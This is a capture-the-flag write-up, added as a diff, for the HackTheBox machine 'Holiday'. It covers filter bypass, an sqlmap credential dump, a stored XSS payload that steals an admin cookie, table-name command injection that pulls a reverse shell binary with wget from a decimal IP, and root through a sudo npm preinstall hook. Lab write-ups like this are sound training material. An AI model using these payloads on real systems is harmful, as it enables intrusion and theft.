@@ -1,0 +1,89 @@
+Holiday
+
+21st October 2017 / Document No D17.100.29
+
+Prepared By: Alexander Reid (Arrexel)
+Machine Author: g0blin
+Difficulty: Insane
+Classification: Official
+
+                                                                         Page 1 / 8
+SYNOPSIS
+
+Holiday is definitely one of the more challenging machines on HackTheBox. It touches on many
+different subjects and demonstrates the severity of stored XSS, which is leveraged to steal the
+session of an interactive user. The machine is very unique and provides an excellent learning
+experience.
+
+Skills Required                     Skills Learned
+
+ Intermediate knowledge of Linux     Bypassing user agent filtering
+ Basic knowledge of Nodejs and NPM   Bypassing XSS filtering
+                                     Obtaining data with stored XSS
+                                     Exploiting NOPASSWD files
+                                     Exploiting NPM CLI
+
+                                                    Page 2 / 8
+Enumeration
+Nmap
+
+Nmap reveals only OpenSSH and a Node.js server.
+                                                                                                                   Page 3 / 8
+Dirbuster
+
+Attempting to fuzz the Node.js server yields no results at first. After a bit of tweaking (specifically,
+making sure the user agent contains the word Linux in it), a few directories are found.
+
+                                                                                                                   Page 4 / 8
+Exploitation
+SQLMap
+
+Running SQLMap against the /login page with the command s qlmap -r sqlmap.req --level=5
+--risk=3 --dump-all (with sqlmap.req being a sample POST request intercepted by Burp Suite),
+credentials for a low privilege user are exposed. The hash can be easily looked up online. In this
+case, hashkiller.co.uk will find the hash.
+
+                                                                                                                   Page 5 / 8
+XSS
+
+Charcode encode/decode tool: h ttp://jdstiles.com/java/cct.html
+All new notes added to a booking are reviewed approximately every one minute by a user with
+admin privileges. There are several filter in place to prevent XSS and successful exploitation can
+be tricky for some. The most reliable method seems to be using a malformed <img> tag
+combined with eval(String.fromCharCode(...))
+Example: <img src="x/><script>eval(String.fromCharCode(CHARCODE_HERE));</script>">
+
+The above example loads a local js file which gets executed when the administrator views the
+note. The script below will force the administrator to send a POST request to a local Netcat
+listener, which exposes the administrator's cookie data in the contents.
+
+                                                                                                                   Page 6 / 8
+Command Injection
+
+Once access to the administrator account is obtained, it is possible to view the /admin page. On
+the page there is a link to export a specified table. It is possible to escape the table name and
+inject system commands, however there are fairly tight restrictions on characters that can be
+used for the table name. Starting the table name with %2f%26 allows for nearly unrestricted
+command injection.
+
+Converter: https://www.browserling.com/tools/ip-to-dec
+Periods are not permitted, so in order to download a shell, the IP address must be provided in
+decimal format. For example: t able=%2f%26wget%20168431110/writeup w here writeup is a
+reverse shell binary.
+Note that Apache does not handle requests properly by default for integer-based IPs, and it is
+much easier to use a Python SimpleHTTPServer on port 80 to serve the binary.
+
+                                                                                                                   Page 7 / 8
+Privilege Escalation
+
+LinEnum: h ttps://github.com/rebootuser/LinEnum
+Running LInEnum gathers a large amount of information about the system. Most notably,
+NOPASSWD is set for the command s udo /usr/bin/npm i *
+By adding a preinstall option to the p ackage.json file, it is possible to specify a command that
+will be executed during the package installation process. This can be easily exploited to obtain
+the flag or a root shell. After creating a package.json file with n pm init and adding the command
+to the script section, simply run the command sudo /usr/bin/npm i /home/algernon/writeup
+--unsafe
+
+                                                                                                                   Page 8 / 8
+
